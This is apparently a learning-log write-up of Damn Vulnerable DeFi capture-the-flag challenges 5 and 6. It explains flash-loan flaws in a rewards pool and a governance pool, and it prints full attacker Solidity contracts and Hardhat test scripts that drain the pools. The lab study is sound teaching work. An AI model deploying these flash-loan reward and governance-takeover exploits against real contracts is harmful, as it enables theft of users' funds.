## Day 26-30 Flash loan attacks part 2

### Damn Vulnerable DeFi #5

This challange has a pool that gives rewards every five days for those who deposit.  Four other people have staked tokens, but the attacker does not have any tokens.  There also is a flash loan pool to use.  The objective is to claim most of the rewards tokens.  

First let's look at how the rewards are distributed:

```Java
    function deposit(uint256 amount) external {
        if (amount == 0) {
            revert InvalidDepositAmount();
        }

        accountingToken.mint(msg.sender, amount);
        distributeRewards();

        SafeTransferLib.safeTransferFrom(
            liquidityToken,
            msg.sender,
            address(this),
            amount
        );
    }

    function distributeRewards() public returns (uint256 rewards) {
        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);
            }
        }
    }
```

```deposit()``` calls ```distributeRewards()```, this will call ```_recordSnapshot()``` if the block timestamp is greater than that last snapshot timestamp + five days.  We just need to take out the flash loan then deposit() the tokens at the right time, and then withdraw the tokens.  We will need to make an attacker contract to do this because only contracts can take out flash loans from this pool.  

A special attacker contract was written: 
```Java
contract RewarderAttacker {
    FlashLoanerPool public immutable pool;
    TheRewarderPool public immutable rewardPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    address public immutable bossAddress;

    constructor(address _loanPoolAdd, address _rewardPoolAdd) {
        console.log("we created it");
        pool = FlashLoanerPool(_loanPoolAdd);
        rewardPool = TheRewarderPool(_rewardPoolAdd);
        liquidityToken = pool.liquidityToken();
        rewardToken = rewardPool.rewardToken();
        bossAddress = msg.sender;
    }

    function attack() external {
        // get max amount available
        uint maxAvail = liquidityToken.balanceOf(address(pool));
        console.log("max available for a flash loan is: ", maxAvail);

        // take out loan
        pool.flashLoan(maxAvail);

        // send scammed tokens to the boss
        uint numScammed = rewardToken.balanceOf(address(this));
        console.log("num scammed: ", numScammed);
        rewardToken.transfer(bossAddress, numScammed);
    }

    function receiveFlashLoan(uint256 loanVal) external {
        console.log("received a flash loan", loanVal);

        // deposit() in RewarderPool
        liquidityToken.approve(address(rewardPool), loanVal);
        rewardPool.deposit(loanVal);
        // withdraw
        rewardPool.withdraw(loanVal);

        // pay back loan
        liquidityToken.transfer(address(pool), loanVal);
    }
}
```

The Javascript code to call this in a Hardhat test is given here: 

```Javascript
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // wait 5 days

        // take out flash loan and deposit the tokens into rewarderPool
        const RewarderAttackerFactory = await ethers.getContractFactory('RewarderAttacker', deployer);
        let attacker = await RewarderAttackerFactory.connect(player).deploy(flashLoanPool.address, rewarderPool.address);
        await attacker.attack();
```


### Damn Vulnerable DeFi #6 - Selfie

A new lending pool has been created that offers flash loans of DVT tokens.  This pool has a governance token as well.  The pool has 1.5million DVT tokens, we start with 0 and the objective is to take them all.  Also of note is the pool has a total supply of 2m tokens.  

There are three contracts provided with this challenge.  

- SelfiePool - this is an IERC3156FlashLender, with a ```flashLoan()``` function.  
- SimpleGovernance - This implements the functions specified in: ISimpleGovernance.
- ISimpleGovernance - this is the interface for SimpleGovernance, there is a struct for ```GovernanceAction```, as well as functions for finding and executing actions.  

Let's take a look at ```executeAction()```, and ```queueAction()```. 

```Java
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender))
            revert NotEnoughVotes(msg.sender);

        if (target == address(this))
            revert InvalidTarget();
        
        if (data.length > 0 && target.code.length == 0)
            revert TargetMustHaveCode();

        actionId = _actionCounter;

        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        unchecked { _actionCounter++; }

        emit ActionQueued(actionId, msg.sender);
    }

  function executeAction(uint256 actionId) external payable returns (bytes memory) {
        if(!_canBeExecuted(actionId))
            revert CannotExecute(actionId);

        GovernanceAction storage actionToExecute = _actions[actionId];
        actionToExecute.executedAt = uint64(block.timestamp);

        emit ActionExecuted(actionId, msg.sender);

        (bool success, bytes memory returndata) = actionToExecute.target.call{value: actionToExecute.value}(actionToExecute.data);
        if (!success) {
            if (returndata.length > 0) {
                assembly {
                    revert(add(0x20, returndata), mload(returndata))
                }
            } else {
                revert ActionFailed(actionId);
            }
        }

        return returndata;
    }
```

First an action nees to be queued then exectued.  The action can only be queued if it has enough votes, and voting is done simply by holding the tokens.  The amount of tokens needed in this implementation is half of the total supply at the last snapshot.  The action can only be executed if it has never been executed begfore and enough time has passed, in this case two days. One more detail is the snapshots, these must be called on the token by token.snapshot(), however the snapshot trigger is public and 

An attack that we may be able to do is: use the flash lending pool to get enough tokens to vote for a action to pass.  Then wait for the specified time (2 days) and execute the action.  The Action will be send all 1.5m tokens to our address.  

What action can we call to get all the funds out?  There is an ```emergencyExit()``` function in ```SelfiePool``` and it can only be called by the governance contract, lucikly we have control of that.  This should give us all the pieces we need to craft an attack contract.  

A contract to do this is given below: 

```Java
contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool immutable pool;
    SimpleGovernance immutable governance;
    ERC20Snapshot public immutable token;
    uint public actionID;
    address public immutable boss;

    constructor(address _flPoolAdd) {
        pool = SelfiePool(_flPoolAdd);
        governance = pool.governance();
        token = pool.token();
        boss = msg.sender;
    }

    function createAction() external {
        // take out flash loan
        address tokenAdd = address(pool.token());
        uint loanAmnt = pool.maxFlashLoan(tokenAdd);
        console.log("loanAmount: ", loanAmnt);

        // get the flash loan, when we receive it, it will be in: onFlashLoan() below.  
        pool.flashLoan(this, tokenAdd, loanAmnt, "");
    }

    function onFlashLoan(  // copied from OZ IERC3156FlashBorrower.sol abstract
        address initiator,
        address _tokenAdd,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        require(_tokenAdd == address(token), "Not the same type of token");
        require(initiator == address(this), "this is not our request");

        console.log("loanAmount in onFlashLoan: ", amount);
        console.log("our balance: ", token.balanceOf(address(this)));

        // take a snapshot
        DamnValuableTokenSnapshot(governance.getGovernanceToken()).snapshot();

        // call queueAction()
        bytes memory command = abi.encodeWithSignature("emergencyExit(address)", boss);
        governance.queueAction(address(pool), 0, command);
        actionID = 1;

        // payback flash loan, you just need to approve it.  
        token.approve(msg.sender, amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan"); // needed for IERC3156
    }

    function executeAction() external {
        governance.executeAction(actionID);
    }
}
```

The Javascript Hardhat code to trigger this is given below: 

```Javascript
        // take out flash loan and deposit the tokens into rewarderPool
        const SelfieAttackerFactory = await ethers.getContractFactory('SelfieAttacker', deployer);
        let attacker = await SelfieAttackerFactory.connect(player).deploy(pool.address);
        await attacker.createAction();

        // wait 2 days
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        // call exectueAction, and make sure the tokens are sent to player
        await attacker.executeAction();
```
